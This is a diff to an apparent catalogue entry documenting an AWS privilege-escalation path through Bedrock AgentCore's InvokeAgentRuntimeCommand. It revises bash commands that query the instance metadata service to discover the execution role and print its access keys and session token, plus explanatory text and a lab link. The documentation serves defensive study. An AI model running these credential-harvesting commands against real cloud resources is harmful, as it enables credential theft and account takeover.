@@ -32,7 +32,8 @@ exploitationSteps:
 
       command = """bash -c '
       TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
-      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role
+      ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
       '"""
 
       # sys.argv[1] is the existing runtime ARN or harness ARN
@@ -46,7 +47,7 @@ exploitationSteps:
         if "contentDelta" in chunk and "stdout" in chunk["contentDelta"]:
           print(chunk["contentDelta"]["stdout"], end="")
       EOF
-    description: Create the python file that submits a root shell command reading the execution role credentials from MMDS on the existing resource
+    description: Create the python file that submits a root shell command reading the execution role credentials from MMDS on the existing resource. The attacker rarely knows the execution role's alias in advance, so the command first queries the security-credentials path with no name to discover it, then fetches the credential document at the role-specific path, mirroring the EC2 IMDS credential-discovery pattern
   - step: 4
     command: 'CREDS=$(python3 get_creds_from_runtime.py $TARGET_ARN $AWS_REGION)
 
@@ -128,6 +129,12 @@ relatedPaths:
 - bedrock-005
 - ec2-002
 - lambda-003
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: privesc-one-hop/to-admin/bedrockagentcore-invokeagentcommand
+    description: Deploy Terraform into your own AWS account to practice this attack path
 permissions:
   required:
   - permission: bedrock-agentcore:InvokeAgentRuntimeCommand
@@ -135,8 +142,6 @@ permissions:
   additional:
   - permission: bedrock-agentcore:ListAgentRuntimes
     resourceConstraints: List the runtimes that already exist
-  - permission: bedrock-agentcore:ListHarnesses
-    resourceConstraints: List the harnesses that already exist
   - permission: bedrock-agentcore:GetAgentRuntime
     resourceConstraints: Identify the execution role and Inbound Auth type of a target resource
 attackVisualization:
@@ -171,12 +176,13 @@ attackVisualization:
     type: payload
     color: '#99ccff'
     description: |
-      The submitted command reads the execution role credentials from MMDS and prints them, and AgentCore returns the output in the response stream so the attacker can use the credentials from any location.
+      The submitted command reads the execution role credentials from MMDS and prints them, and AgentCore returns the output in the response stream so the attacker can use the credentials from any location. Since the attacker typically does not know the execution role's alias in advance, the command first queries the security-credentials path with no name to discover it, then fetches the full credential document at the role-specific path, the same two-step pattern used to exfiltrate credentials from EC2's IMDS.
 
       Example command body invoked through InvokeAgentRuntimeCommand:
       ```bash
       TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
-      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role
+      ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
       ```
 
       This returns AccessKeyId, SecretAccessKey and Token, which the attacker can export and use until they expire.
